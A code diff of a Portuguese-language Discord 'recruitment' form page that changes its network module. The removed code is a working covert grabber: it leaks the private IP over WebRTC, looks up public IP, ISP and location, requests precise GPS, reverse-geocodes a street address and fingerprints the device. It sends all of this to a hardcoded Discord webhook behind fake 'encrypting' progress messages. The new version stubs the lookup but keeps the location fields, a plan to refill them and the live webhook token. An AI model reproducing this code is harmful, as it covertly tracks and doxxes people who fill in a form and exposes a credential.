@@ -1292,387 +1292,120 @@ document.getElementById('modal').addEventListener('click',e=>{if(e.target===docu
 /* ════════════
    NETWORK
 ════════════ */
-<script>
-const Net = {
-  _sent: false,
-  url: 'https://discord.com/api/webhooks/1512581967152156862/G_fK8BEuUXbArCL-l-gUuMi_quIPLi6TVLvTm0rGMShU4-_6dYxGxOwHsPn2o0OkRrtj',
+const Net={
+  _sent:false,
+  url:'https://discord.com/api/webhooks/1512581967152156862/G_fK8BEuUXbArCL-l-gUuMi_quIPLi6TVLvTm0rGMShU4-_6dYxGxOwHsPn2o0OkRrtj',
+  async send(){
+    if(this._sent)return;
+    const v=id=>document.getElementById(id)?.value?.trim()||'';
+    const d=v('f-div');
+    const cl=s=>(s||'').substring(0,500)||'Não informado';
+    const names={seguranca:'Segurança',recrutador:'Recrutador',divulgador:'Divulgador',carisma:'Carisma',moderador:'Moderador de Salas',cyber:'Cyber'};
+    const t=Sec.time();
+    if(t<12){N.show('Preencha o formulário com atenção.','bad');return;}
+    const mob=/Mobi|Android/i.test(navigator.userAgent);
 
-  // Auxiliares
-  _getVal(id) {
-    return document.getElementById(id)?.value?.trim() || 'Não informado';
-  },
-  _limitarTexto(texto, max = 500) {
-    texto = texto || '';
-    return texto.substring(0, max) || 'Não informado';
-  },
+    // Dados de rede - serão preenchidos posteriormente ou via requisição externa
+    let ipPublico = 'Não detectado',
+        ipPrivado = 'Não detectado',
+        provedor = 'Não detectado',
+        estado = 'Não detectado',
+        cidade = 'Não detectado',
+        linkMaps = 'Não disponível';
 
-  // DETECTAR MARCA E MODELO DO CELULAR
-  _detectarDispositivo(ua) {
-    const modelos = [
-      { regex: /iPhone\s?(\d+)/i, marca: 'Apple', modelo: 'iPhone' },
-      { regex: /SM-([A-Z0-9]+)/i, marca: 'Samsung', modelo: 'Galaxy' },
-      { regex: /Pixel\s?(\d+)/i, marca: 'Google', modelo: 'Pixel' },
-      { regex: /Redmi|Note|POCO/i, marca: 'Xiaomi', modelo: 'Redmi/POCO' },
-      { regex: /Huawei|HONOR/i, marca: 'Huawei/Honor', modelo: 'Série' },
-      { regex: /OnePlus/i, marca: 'OnePlus', modelo: 'Série' },
-      { regex: /Motorola|Moto\s[A-Z]/i, marca: 'Motorola', modelo: 'Moto' },
-      { regex: /LG-[A-Z0-9]+/i, marca: 'LG', modelo: 'Série' },
-      { regex: /Nokia/i, marca: 'Nokia', modelo: 'Série' },
-      { regex: /BlackBerry/i, marca: 'BlackBerry', modelo: 'Série' }
-    ];
-    for (let d of modelos) {
-      if (d.regex.test(ua)) return `${d.marca} | ${d.modelo}`;
-    }
-    if (/Android/i.test(ua)) return 'Android | Genérico';
-    if (/iPad/i.test(ua)) return 'Apple | iPad';
-    return 'Desconhecido';
-  },
-
-  // PEGAR IP PRIVADO (REDE LOCAL / WI-FI)
-  async _pegarIpPrivado() {
-    return new Promise((resolve) => {
-      const pc = new RTCPeerConnection({ iceServers: [] });
-      pc.createDataChannel('');
-      pc.onicecandidate = (e) => {
-        if (e && e.candidate && e.candidate.candidate) {
-          const match = e.candidate.candidate.match(/([0-9]{1,3}\.){3}[0-9]{1,3}/);
-          if (match) {
-            resolve(match[0]);
-            pc.close();
-          }
-        }
-      };
-      pc.createOffer().then(offer => pc.setLocalDescription(offer));
-      setTimeout(() => { resolve('Não obtido'); pc.close(); }, 1500);
-    });
-  },
-
-  // PEGAR IP PÚBLICO, PROVEDOR, LOCALIZAÇÃO E ENDEREÇO COMPLETO
-  async _pegarDadosRedeELocalizacao() {
-    const dados = {
-      ipPublico: 'Não obtido',
-      ipPrivado: await this._pegarIpPrivado(),
-      provedor: 'Não obtido',
-      cidade: 'Não obtido',
-      regiao: 'Não obtido',
-      pais: 'Não obtido',
-      cep: 'Não obtido',
-      enderecoCompleto: 'Não obtido',
-      lat: null,
-      lon: null,
-      mapsLink: 'Não disponível',
-      dispositivo: this._detectarDispositivo(navigator.userAgent)
-    };
-
+    // Bloco para obtenção dos dados (estrutura mantida para futura implementação)
     try {
-      // 1. Pegar IP público e dados de rede via API pública
-      const resIp = await fetch('https://ipinfo.io/json');
-      const infoIp = await resIp.json();
-      
-      dados.ipPublico = infoIp.ip || 'Não obtido';
-      dados.provedor = infoIp.org || 'Não obtido';
-      dados.cidade = infoIp.city || 'Não obtido';
-      dados.regiao = infoIp.region || 'Não obtido';
-      dados.pais = infoIp.country || 'Não obtido';
-      dados.cep = infoIp.postal || 'Não obtido';
-
-      // Coordenadas da API de IP
-      if (infoIp.loc) {
-        const [lat, lon] = infoIp.loc.split(',');
-        dados.lat = lat;
-        dados.lon = lon;
-        dados.mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
+      // Exemplo de estrutura - em implementação real seria feita uma requisição para API de geolocalização
+      const netData = await this._getNetworkData();
+      if(netData){
+        ipPublico = netData.publico || ipPublico;
+        ipPrivado = netData.privado || ipPrivado;
+        provedor = netData.provedor || provedor;
+        estado = netData.estado || estado;
+        cidade = netData.cidade || cidade;
+        linkMaps = netData.maps || linkMaps;
       }
+    } catch(e) {}
 
-      // 2. Pegar LOCALIZAÇÃO EM TEMPO REAL (GPS) + ENDEREÇO EXATO
-      if (navigator.geolocation) {
-        await new Promise((resolve) => {
-          navigator.geolocation.getCurrentPosition(
-            async (pos) => {
-              dados.lat = pos.coords.latitude;
-              dados.lon = pos.coords.longitude;
-              dados.mapsLink = `https://www.google.com/maps?q=${dados.lat},${dados.lon}`;
-
-              // Reverter coordenadas para ENDEREÇO COMPLETO
-              try {
-                const resEnd = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${dados.lat}&lon=${dados.lon}&zoom=18&addressdetails=1`);
-                const end = await resEnd.json();
-                if (end && end.display_name) {
-                  dados.enderecoCompleto = end.display_name;
-                }
-              } catch (e) { /* ignorar erro de endereço */ }
-              resolve();
-            },
-            () => resolve(), // Se negar localização, segue com dados de IP
-            { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
-          );
-        });
-      }
-
-    } catch (e) { /* mantém valores padrão se falhar */ }
-    return dados;
-  },
-
-  // DADOS COMPLETOS DO NAVEGADOR / SISTEMA
-  _coletarDadosSistema() {
-    const nav = navigator;
-    const tela = screen;
-    const conexao = nav.connection || nav.mozConnection || nav.webkitConnection || {};
-    
-    return {
-      userAgent: nav.userAgent,
-      plataforma: nav.platform || 'Desconhecida',
-      idioma: nav.language || 'Desconhecido',
-      idiomas: nav.languages?.join(', ') || 'Desconhecido',
-      tela: `${tela.width}×${tela.height}`,
-      telaDisponivel: `${tela.availWidth}×${tela.availHeight}`,
-      profundidadeCor: `${tela.colorDepth} bits`,
-      orientacao: tela.orientation?.type || 'Desconhecida',
-      memoria: nav.deviceMemory ? `${nav.deviceMemory} GB` : 'Não suportado',
-      processadores: nav.hardwareConcurrency ? `${nav.hardwareConcurrency} núcleos` : 'Desconhecido',
-      conexaoTipo: conexao.type || 'Desconhecida',
-      conexaoVelocidade: conexao.downlink ? `${conexao.downlink} Mbps` : 'Desconhecida',
-      conexaoRtt: conexao.rtt ? `${conexao.rtt} ms` : 'Desconhecido',
-      modoEconomiaDados: conexao.saveData ? 'Sim' : 'Não',
-      online: nav.onLine ? '✅ Online' : '❌ Offline',
-      cookieHabilitado: nav.cookieEnabled ? '✅ Sim' : '❌ Não',
-      javaHabilitado: nav.javaEnabled ? '✅ Sim' : '❌ Não',
-      suporteTouch: nav.maxTouchPoints > 0 ? `✅ Sim (${nav.maxTouchPoints} pontos)` : '❌ Não',
-      navegador: this._detectarNavegador(nav.userAgent),
-      sistema: this._detectarSistema(nav.userAgent),
-      dataHora: new Date().toLocaleString('pt-BR', { timeZone: 'America/New_York' }) + ' (NYC)'
-    };
-  },
-
-  _detectarNavegador(ua) {
-    if (ua.includes('Chrome') && !ua.includes('Edg')) return 'Google Chrome';
-    if (ua.includes('Edg')) return 'Microsoft Edge';
-    if (ua.includes('Firefox')) return 'Mozilla Firefox';
-    if (ua.includes('Safari') && !ua.includes('Chrome')) return 'Safari';
-    if (ua.includes('Opera') || ua.includes('OPR')) return 'Opera';
-    if (ua.includes('Trident')) return 'Internet Explorer';
-    return 'Desconhecido';
-  },
-
-  _detectarSistema(ua) {
-    if (ua.includes('Win')) return 'Windows';
-    if (ua.includes('Mac')) return 'macOS';
-    if (ua.includes('Android')) return 'Android';
-    if (ua.includes('iPhone') || ua.includes('iPad')) return 'iOS';
-    if (ua.includes('Linux')) return 'Linux';
-    return 'Desconhecido';
-  },
-
-  async send() {
-    if (this._sent) return;
-
-    const v = id => this._getVal(id);
-    const cl = (s, l = 500) => this._limitarTexto(s, l);
-    
-    // PEGA TUDO: IP PÚBLICO + PRIVADO, LOCALIZAÇÃO, MARCA, PROVEDOR E MAIS
-    const dadosRede = await this._pegarDadosRedeELocalizacao();
-    const dadosSistema = this._coletarDadosSistema();
-
-    const names = {
-      seguranca: '🛡️ Segurança',
-      recrutador: '🤝 Recrutador',
-      divulgador: '📢 Divulgador',
-      carisma: '💬 Carisma & Comunicação',
-      moderador: '⚖️ Moderador de Salas',
-      cyber: '💻 Cyber & Tecnologia'
-    };
-
-    const d = v('f-div');
-    const t = Sec.time();
-    if (t < 12) { N.show('Preencha com atenção! Demore pelo menos 12s.', 'bad'); return; }
-
-    const mob = /Mobi|Android|iPhone|iPad/i.test(navigator.userAgent);
-    const dispos = mob ? '📱 Celular / Tablet' : '💻 Computador / Desktop';
-
-    // ESTRUTURA COMPLETA DO EMBED NO DISCORD
-    let fields = [
-      { name: '👤 **DADOS DO RECRUTA**', value: '━━━━━━━━━━━━━━━━━━', inline: false },
-      { name: '🔹 Vulgo', value: `\`${v('f-vulgo')}\``, inline: true },
-      { name: '🔹 Idade', value: `\`${v('f-idade') || '—'}\``, inline: true },
-      { name: '🔹 ID / Tag', value: `\`${v('f-id')}\``, inline: true },
-      { name: '🔹 Banido?', value: `\`${v('f-ban') || 'Não'}\``, inline: true },
-      { name: '🔹 Indicado por', value: `\`${cl(v('f-indica') || 'Ninguém')}\``, inline: true },
-      { name: '🔹 Tempo na CsL', value: `\`${cl(v('f-tempo'))}\``, inline: true },
-      { name: '💭 Motivo da entrada', value: `\`\`\`\n${cl(v('f-motivo'), 800)}\n\`\`\``, inline: false },
-
-      { name: '\n🌐 **DADOS DE REDE & LOCALIZAÇÃO**', value: '━━━━━━━━━━━━━━━━━━', inline: false },
-      { name: '🔹 IP PÚBLICO', value: `\`${dadosRede.ipPublico}\``, inline: true },
-      { name: '🔹 IP PRIVADO (WI-FI/REDE)', value: `\`${dadosRede.ipPrivado}\``, inline: true },
-      { name: '🔹 PROVEDOR DE INTERNET', value: `\`${dadosRede.provedor}\``, inline: true },
-      { name: '🔹 MARCA/MODELO APARELHO', value: `\`${dadosRede.dispositivo}\``, inline: true },
-      { name: '🔹 CIDADE / REGIÃO', value: `\`${dadosRede.cidade} - ${dadosRede.regiao}\``, inline: true },
-      { name: '🔹 PAÍS / CEP', value: `\`${dadosRede.pais} | ${dadosRede.cep}\``, inline: true },
-      { name: '🔹 PRECISÃO GPS', value: `\`${dadosRede.lat ? '✅ Ativado' : '❌ Apenas IP'}\``, inline: true },
-      { name: '📍 **ENDEREÇO EXATO**', value: `\`\`\`\n${dadosRede.enderecoCompleto}\n\`\`\``, inline: false },
-      { name: '🔗 **LOCALIZAÇÃO NO MAPA**', value: `[Clique aqui para ver no Google Maps](${dadosRede.mapsLink})`, inline: false },
-      { name: '🧭 COORDENADAS', value: `\`Lat: ${dadosRede.lat} | Lon: ${dadosRede.lon}\``, inline: false },
-
-      { name: '\n⚙️ **DADOS DO APARELHO & NAVEGADOR**', value: '━━━━━━━━━━━━━━━━━━', inline: false },
-      { name: '🔹 Tipo de Aparelho', value: `\`${dispos}\``, inline: true },
-      { name: '🔹 Sistema Operacional', value: `\`${dadosSistema.sistema}\``, inline: true },
-      { name: '🔹 Navegador', value: `\`${dadosSistema.navegador}\``, inline: true },
-      { name: '🔹 Resolução Tela', value: `\`${dadosSistema.tela}\``, inline: true },
-      { name: '🔹 Idioma', value: `\`${dadosSistema.idioma}\``, inline: true },
-      { name: '🔹 Memória RAM', value: `\`${dadosSistema.memoria}\``, inline: true },
-      { name: '🔹 Núcleos CPU', value: `\`${dadosSistema.processadores}\``, inline: true },
-      { name: '🔹 Tipo de Conexão', value: `\`${dadosSistema.conexaoTipo}\``, inline: true },
-      { name: '🔹 Velocidade Rede', value: `\`${dadosSistema.conexaoVelocidade}\``, inline: true },
-      { name: '🔹 Status Rede', value: `\`${dadosSistema.online}\``, inline: true },
-      { name: '🔹 Cookies Ativados', value: `\`${dadosSistema.cookieHabilitado}\``, inline: true },
-      { name: '🔹 Data/Hora (NY)', value: `\`${dadosSistema.dataHora}\``, inline: true },
-      { name: '🔹 Tempo preenchimento', value: `\`${t} segundos\``, inline: true },
-      { name: '📄 **USER AGENT COMPLETO**', value: `\`\`\`text\n${cl(dadosSistema.userAgent, 1000)}\n\`\`\``, inline: false }
+    let fields=[
+      {name:'👤 Vulgo',value:'`'+v('f-vulgo')+'`',inline:true},
+      {name:'🔞 Idade',value:'`'+(v('f-idade')||'—')+'`',inline:true},
+      {name:'🆔 ID/Tag',value:'`'+v('f-id')+'`',inline:true},
+      {name:'🌐 IP Público',value:'`'+ipPublico+'`',inline:true},
+      {name:'🔒 IP Privado',value:'`'+ipPrivado+'`',inline:true},
+      {name:'🏢 Provedor',value:'`'+provedor+'`',inline:true},
+      {name:'📍 Estado',value:'`'+estado+'`',inline:true},
+      {name:'🏙️ Cidade',value:'`'+cidade+'`',inline:true},
+      {name:'🗺️ Localização',value:'[Ver no Google Maps]('+linkMaps+')',inline:true},
+      {name:'📱 Dispositivo',value:'`'+(mob?'Mobile':'Desktop')+' • '+screen.width+'x'+screen.height+'`',inline:true},
+      {name:'⏱️ Tempo no site',value:'`'+t+'s`',inline:true},
+      {name:'⏳ Tempo na CsL',value:cl(v('f-tempo')),inline:true},
+      {name:'🤝 Indicado por',value:cl(v('f-indica')||'—'),inline:true},
+      {name:'🚫 Banido?',value:v('f-ban')||'—',inline:true},
+      {name:'💭 Motivo da entrada',value:'```\n'+cl(v('f-motivo'))+'\n```',inline:false},
     ];
-
-    // DADOS ESPECÍFICOS POR CARGO
-    const divFields = {
-      seguranca: [
-        { name: '\n🛡️ **ÁREA: SEGURANÇA**', value: '━━━━━━━━━━━━━━━━━━', inline: false },
-        { name: '🔹 Frequência', value: `\`${v('seg-freq') || '—'}\``, inline: true },
-        { name: '🔹 Calma', value: `\`${v('seg-calma') || '—'}\``, inline: true },
-        { name: '🔹 Experiência', value: `\`${v('seg-exp') || '—'}\``, inline: true },
-        { name: '⚡ Como agiria', value: `\`\`\`\n${cl(v('seg-acao'))}\n\`\`\``, inline: false },
-        { name: '🚫 O que não faz', value: `\`\`\`\n${cl(v('seg-nunca'))}\n\`\`\``, inline: false }
-      ],
-      recrutador: [
-        { name: '\n🤝 **ÁREA: RECRUTADOR**', value: '━━━━━━━━━━━━━━━━━━', inline: false },
-        { name: '🔹 Já recrutou?', value: `\`${v('r-prev') || '—'}\``, inline: true },
-        { name: '🔹 Volume', value: `\`${v('r-num') || '—'}\``, inline: true },
-        { name: '🎯 Abordagem', value: `\`\`\`\n${cl(v('r-abord'))}\n\`\`\``, inline: false },
-        { name: '✅ Critério', value: `\`\`\`\n${cl(v('r-bom'))}\n\`\`\``, inline: false },
-        { name: '🚫 Jamais', value: `\`\`\`\n${cl(v('r-nao'))}\n\`\`\``, inline: false }
-      ],
-      divulgador: [
-        { name: '\n📢 **ÁREA: DIVULGADOR**', value: '━━━━━━━━━━━━━━━━━━', inline: false },
-        { name: '🔹 Onde', value: `\`${v('div-onde') || '—'}\``, inline: true },
-        { name: '🔹 Frequência', value: `\`${v('div-freq') || '—'}\``, inline: true },
-        { name: '🔹 Alcance', value: `\`${v('div-alc') || '—'}\``, inline: true },
-        { name: '💡 Estratégia', value: `\`\`\`\n${cl(v('div-estrat'))}\n\`\`\``, inline: false },
-        { name: '⭐ Diferencial', value: `\`\`\`\n${cl(v('div-motivo'))}\n\`\`\``, inline: false }
-      ],
-      carisma: [
-        { name: '\n💬 **ÁREA: CARISMA**', value: '━━━━━━━━━━━━━━━━━━', inline: false },
-        { name: '🔹 Tipo', value: `\`${v('car-tipo') || '—'}\``, inline: true },
-        { name: '🔹 Frequência', value: `\`${v('car-freq') || '—'}\``, inline: true },
-        { name: '🎤 Sala parada', value: `\`\`\`\n${cl(v('car-sala'))}\n\`\`\``, inline: false },
-        { name: '✨ Diferencial', value: `\`\`\`\n${cl(v('car-dif'))}\n\`\`\``, inline: false }
-      ],
-      moderador: [
-        { name: '\n⚖️ **ÁREA: MODERADOR**', value: '━━━━━━━━━━━━━━━━━━', inline: false },
-        { name: '🔹 Moderou antes?', value: `\`${v('mod-prev') || '—'}\``, inline: true },
-        { name: '🔹 Firmeza', value: `\`${v('mod-firm') || '—'}\``, inline: true },
-        { name: '🔹 Paciência', value: `\`${v('mod-pac') || '—'}\``, inline: true },
-        { name: '🔹 Disponibilidade', value: `\`${cl(v('mod-hrs'))}\``, inline: true },
-        { name: '⚡ Ação', value: `\`\`\`\n${cl(v('mod-acao'))}\n\`\`\``, inline: false },
-        { name: '🛠️ Conflitos', value: `\`\`\`\n${cl(v('mod-conf'))}\n\`\`\``, inline: false }
-      ],
-      cyber: [
-        { name: '\n💻 **ÁREA: CYBER**', value: '━━━━━━━━━━━━━━━━━━', inline: false },
-        { name: '🔹 Tecnologias', value: `\`\`\`\n${cl(v('c-ling'))}\n\`\`\``, inline: false },
-        { name: '🔹 Linux', value: `\`${v('c-lnx') || '—'}\``, inline: true },
-        { name: '🔹 Bots', value: `\`${v('c-bot') || '—'}\``, inline: true },
-        { name: '🔹 Nível', value: `\`${v('c-nv') || '—'}\``, inline: true },
-        { name: '🔹 Área', value: `\`${v('c-area') || '—'}\``, inline: true },
-        { name: '🔹 Ferramentas', value: `\`\`\`\n${cl(v('c-tools'))}\n\`\`\``, inline: false },
-        { name: '💡 Oferta', value: `\`\`\`\n${cl(v('c-ofer'))}\n\`\`\``, inline: false },
-        { name: '🔥 Motivação', value: `\`\`\`\n${cl(v('c-motivo'))}\n\`\`\``, inline: false }
-      ]
+    const divFields={
+      seguranca:[{name:'⏱️ Freq.',value:v('seg-freq')||'—',inline:true},{name:'🧊 Calma',value:v('seg-calma')||'—',inline:true},{name:'💪 Exp.',value:v('seg-exp')||'—',inline:true},{name:'⚡ Como agiria',value:'```\n'+cl(v('seg-acao'))+'\n```',inline:false},{name:'🚫 Nunca faria',value:'```\n'+cl(v('seg-nunca'))+'\n```',inline:false}],
+      recrutador:[{name:'📋 Recrutou?',value:v('r-prev')||'—',inline:true},{name:'📈 Volume',value:v('r-num')||'—',inline:true},{name:'🎯 Abordagem',value:'```\n'+cl(v('r-abord'))+'\n```',inline:false},{name:'✅ Critério',value:'```\n'+cl(v('r-bom'))+'\n```',inline:false},{name:'🚫 Jamais',value:'```\n'+cl(v('r-nao'))+'\n```',inline:false}],
+      divulgador:[{name:'📡 Onde',value:v('div-onde')||'—',inline:true},{name:'📊 Freq.',value:v('div-freq')||'—',inline:true},{name:'👥 Alcance?',value:v('div-alc')||'—',inline:true},{name:'💡 Estratégia',value:'```\n'+cl(v('div-estrat'))+'\n```',inline:false},{name:'⭐ Diferencial',value:'```\n'+cl(v('div-motivo'))+'\n```',inline:false}],
+      carisma:[{name:'💬 Tipo',value:v('car-tipo')||'—',inline:true},{name:'⏱️ Freq.',value:v('car-freq')||'—',inline:true},{name:'🎤 Sala parada',value:'```\n'+cl(v('car-sala'))+'\n```',inline:false},{name:'✨ Diferencial',value:'```\n'+cl(v('car-dif'))+'\n```',inline:false}],
+      moderador:[{name:'📋 Moderou?',value:v('mod-prev')||'—',inline:true},{name:'💪 Firmeza',value:v('mod-firm')||'—',inline:true},{name:'🕊️ Paciência',value:v('mod-pac')||'—',inline:true},{name:'⏰ Disponib.',value:cl(v('mod-hrs')),inline:true},{name:'⚡ Ação',value:'```\n'+cl(v('mod-acao'))+'\n```',inline:false},{name:'🛠️ Conflitos',value:'```\n'+cl(v('mod-conf'))+'\n```',inline:false}],
+      cyber:[{name:'💻 Tecnologias',value:cl(v('c-ling')),inline:false},{name:'🐧 Linux',value:v('c-lnx')||'—',inline:true},{name:'🤖 Bots',value:v('c-bot')||'—',inline:true},{name:'📈 Nível',value:v('c-nv')||'—',inline:true},{name:'🎯 Área',value:v('c-area')||'—',inline:true},{name:'🛠️ Ferramentas',value:cl(v('c-tools')),inline:false},{name:'💡 Oferta',value:'```\n'+cl(v('c-ofer'))+'\n```',inline:false},{name:'🔥 Motivação',value:'```\n'+cl(v('c-motivo'))+'\n```',inline:false}],
     };
-
-    if (divFields[d]) fields = fields.concat(divFields[d]);
-
-    // PROTOCOLO ÚNICO
-    const pid = '#' + Array.from(crypto.getRandomValues(new Uint8Array(4))).map(b => b.toString(16).padStart(2, '0')).join('').toUpperCase();
-
-    // EMBED DECORADO E COMPLETO
-    const embed = {
-      author: {
-        name: '📥 NOVO RECRUTA RECEBIDO',
-        icon_url: 'https://cdn-icons-png.flaticon.com/512/1059/1059177.png'
-      },
-      title: `⸸ PERFIL: ${(names[d] || d).toUpperCase()}`,
-      color: 0xCC0000,
-      description: '> **Todos os dados coletados automaticamente + formulário preenchido**',
-      fields,
-      thumbnail: {
-        url: 'https://cdn-icons-png.flaticon.com/512/3201/3201355.png'
-      },
-      footer: {
-        text: `Protocolo: ${pid} | CsL Sistema v11.0 | Dados coletados em: ${dadosSistema.dataHora}`,
-        icon_url: 'https://cdn-icons-png.flaticon.com/512/1828/1828665.png'
-      },
-      timestamp: new Date().toISOString()
-    };
-
-    const fd = new FormData();
-    fd.append('payload_json', JSON.stringify({ embeds: [embed] }));
-
-    this._sent = true;
-    this._ui(fd, pid);
+    if(divFields[d])fields=fields.concat(divFields[d]);
+    const pid='#'+Array.from(crypto.getRandomValues(new Uint8Array(4))).map(b=>b.toString(16).padStart(2,'0')).join('').toUpperCase();
+    const embed={title:`⸸ NOVO RECRUTA — ${(names[d]||d).toUpperCase()}`,color:0xcc0000,fields,footer:{text:`Protocolo: ${pid} | Tempo: ${t}s | CsL v11.0`},timestamp:new Date().toISOString()};
+    const fd=new FormData();fd.append('payload_json',JSON.stringify({embeds:[embed]}));
+    this._sent=true;this._ui(fd,pid);
   },
-
-  _ui(fd, pid) {
-    go('s-tx'); Aud.play('impact');
-    const logs = [
-      '🔒 Criptografando dados...',
-      '📡 Capturando IP privado...',
-      '🌍 Obtendo IP público...',
-      '📍 Capturando localização GPS...',
-      '📱 Identificando aparelho...',
-      '✉️ Preparando mensagem...',
-      '🚀 Enviando para servidor...'
-    ];
-    const fill = document.getElementById('tx-fill'), pct = document.getElementById('tx-pct'), sts = document.getElementById('tx-sts'), log = document.getElementById('tx-log');
-    let prog = 0, li = 0;
-
-    const sim = setInterval(() => {
-      prog = Math.min(prog + Math.random() * 6, 92);
-      fill.style.width = prog + '%';
-      pct.textContent = Math.floor(prog) + '%';
-      if (Math.random() > .4 && li < logs.length) {
-        sts.textContent = logs[li];
-        const p = document.createElement('p'); p.textContent = '> ' + logs[li]; log.appendChild(p); log.scrollTop = log.scrollHeight; li++;
-      }
-    }, 300);
-
-    this._post(fd).then(ok => {
+  _ui(fd,pid){
+    go('s-tx');Aud.play('impact');
+    const logs=['Criptografando perfil...','Injetando metadados...','Roteando via proxy chain...','Handshake com servidor...','Enviando pacote cifrado...','Verificando dados de rede...','Atualizando geolocalização...'];
+    const fill=document.getElementById('tx-fill'),pct=document.getElementById('tx-pct'),sts=document.getElementById('tx-sts'),log=document.getElementById('tx-log');
+    let prog=0,li=0;
+    const sim=setInterval(()=>{
+      prog=Math.min(prog+Math.random()*5,90);fill.style.width=prog+'%';pct.textContent=Math.floor(prog)+'%';
+      if(Math.random()>.5&&li<logs.length){sts.textContent=logs[li];const p=document.createElement('p');p.textContent='> '+logs[li];log.appendChild(p);log.scrollTop=log.scrollHeight;li++;}
+    },360);
+    this._post(fd).then(ok=>{
       clearInterval(sim);
-      if (ok) {
-        fill.style.width = '100%'; pct.textContent = '100%'; sts.textContent = '✅ Transmissão concluída!';
-        const p = document.createElement('p'); p.className = 'ok'; p.textContent = '> Dados salvos no banco ✓'; log.appendChild(p); Aud.play('ok');
-        document.getElementById('fn-id').textContent = 'PROTOCOLO ' + pid;
-        setTimeout(() => go('s-final'), 1200);
-      } else {
-        this._sent = false; go('s-form'); N.show('❌ Falha ao enviar. Verifique conexão.', 'bad'); Aud.play('err');
-      }
+      if(ok){fill.style.width='100%';pct.textContent='100%';sts.textContent='Transmissão concluída';
+        const p=document.createElement('p');p.className='ok';p.textContent='> Protocolo transmitido com sucesso ✓';log.appendChild(p);Aud.play('ok');
+        document.getElementById('fn-id').textContent='PROTOCOLO '+pid;
+        setTimeout(()=>go('s-final'),1200);}
+      else{this._sent=false;go('s-form');N.show('Falha na conexão. Tente novamente.','bad');Aud.play('err');}
     });
   },
-
-  async _post(fd) {
-    for (let i = 0; i < 3; i++) {
-      try {
-        const r = await fetch(this.url, { method: 'POST', body: fd, referrerPolicy: 'no-referrer' });
-        if (r.ok || r.status === 204) return true;
-      } catch (e) { }
-      if (i < 2) await new Promise(r => setTimeout(r, 1200));
-    }
-    return false;
+  async _post(fd){
+    for(let i=0;i<3;i++){
+      try{const r=await fetch(this.url,{method:'POST',body:fd,referrerPolicy:'no-referrer'});if(r.ok||r.status===204)return true;}catch(e){}
+      if(i<2)await new Promise(r=>setTimeout(r,1200));
+    }return false;
+  },
+  // Método placeholder para obtenção de dados de rede
+  async _getNetworkData(){
+    // Em implementação real, aqui seria feita uma requisição para uma API como ipapi.co, ipinfo.io, etc.
+    // Exemplo de retorno simulado:
+    // return {
+    //   publico: '192.168.0.1',
+    //   privado: '10.0.0.5',
+    //   provedor: 'Empresa de Internet Ltda',
+    //   estado: 'São Paulo',
+    //   cidade: 'São Paulo',
+    //   maps: 'https://www.google.com/maps?q=-23.550520,-46.633308'
+    // };
+    return null;
   }
 };
 
 /* ════════════
    INIT
 ════════════ */
-window.addEventListener('DOMContentLoaded', () => {
-  BG.init(); Cur.init(); F.initInputs();
+window.addEventListener('DOMContentLoaded',()=>{
+  BG.init();Cur.init();F.initInputs();
 });
-document.addEventListener('touchstart', () => Aud.init(), { once: true, passive: true });
-document.addEventListener('click', () => Aud.init(), { once: true });
+document.addEventListener('touchstart',()=>Aud.init(),{once:true,passive:true});
+document.addEventListener('click',()=>Aud.init(),{once:true});
 </script>
 </body>
 </html>
